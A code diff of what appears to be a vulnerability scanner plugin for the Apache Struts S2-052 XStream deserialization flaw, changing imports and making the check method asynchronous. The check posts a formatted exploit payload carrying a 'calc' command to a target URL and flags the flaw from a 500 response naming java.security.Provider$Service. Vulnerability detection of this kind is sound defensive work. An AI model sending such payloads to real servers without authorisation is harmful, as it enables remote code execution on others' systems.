@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_052_BaseVerify:
     def __init__(self, url):
@@ -78,7 +78,7 @@ class S2_052_BaseVerify:
                     </map>
                 '''
         
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -90,15 +90,12 @@ class S2_052_BaseVerify:
 
         try:
             self.check_payload = self.payload.format(cmd = '<string>calc</string>')
-            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
-            if check_req.status_code == 500 and 'java.security.Provider$Service' in check_req.text:
+            check_req = await request.post(self.url, headers = self.headers, data = self.check_payload)
+            if check_req.status == 500 and 'java.security.Provider$Service' in await check_req.text():
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
